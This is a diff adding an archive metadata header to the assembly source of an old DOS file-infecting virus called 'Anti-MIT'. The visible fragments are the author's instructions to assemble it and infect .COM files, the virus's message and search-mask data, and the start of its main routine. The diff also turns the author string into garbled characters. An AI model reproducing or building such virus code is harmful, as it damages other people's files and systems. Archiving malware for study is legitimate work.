@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      M
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;                          **  Anti-MIT Virus **
 ;       To assemble, use TASM and TLINK to create a .COM file. Next
 ;    run the .COM file in the same directory of a file you want to infect.
@@ -66,7 +77,7 @@ message         db      'MIT Sux! $'          ; The "message"
 lengthp         dw      ?                     ; Length of infected file
 allcom          db      '*.COM',0             ; What to search for
 virus           db      '[Anti-MIT]',0        ; Virus name
-author          db      'FŒrsØStrŒkä',0       ; Author
+author          db      'Fï¿½rsï¿½Strï¿½kï¿½',0       ; Author
 
 main:                                         ; Main virus code
 	mov     ah,2ah                        ; Get the date
